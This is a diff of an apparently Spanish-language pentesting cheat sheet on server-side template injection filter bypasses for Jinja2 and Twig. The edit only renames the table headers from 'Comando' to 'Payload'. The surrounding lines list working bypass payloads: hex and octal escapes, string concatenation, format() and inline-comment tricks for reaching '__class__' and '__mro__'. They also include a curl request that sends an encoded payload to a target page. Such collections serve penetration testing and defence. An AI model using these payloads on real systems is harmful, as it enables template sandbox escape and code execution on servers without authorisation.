@@ -20,7 +20,7 @@ linked:
 
 ## Encoding (Unicode / Hex / Base64)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `{{ ()\|attr('\x5f\x5fclass\x5f\x5f')\|attr('\x5f\x5fmro\x5f\x5f') }}` | Hex escapes en attr arg → bypass `__` filter | Sandbox bloquea `__` literal. |
 | `{{ '\137\137class\137\137' }}` (octal escapes) | Same idea base 8 | Filter regex no captura octal. |
@@ -38,7 +38,7 @@ linked:
 
 ## String Concatenation
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `{{ '__cl' + 'ass__' }}` | Python concat runtime → `__class__` | Filter literal `__class__`. |
 | `{{ "{}{}{}".format('__','cl','ass__') }}` | format() concat | Filter `+` blocked. |
@@ -93,7 +93,7 @@ curl -G "https://target/page" --data-urlencode "q={{()|attr('%c%c%c%c%c%c%c%c%c'
 
 ## Comment / Whitespace Tricks
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `{{ '__cl' ~ {# x #} ~ 'ass__' }}` (Jinja2 inline comment) | Romper string match con comment | Filter naive sobre raw string. |
 | `{{ '_'~{# comment #}'_class__' }}` | Twig variant — inline comment break | Twig sandbox. |
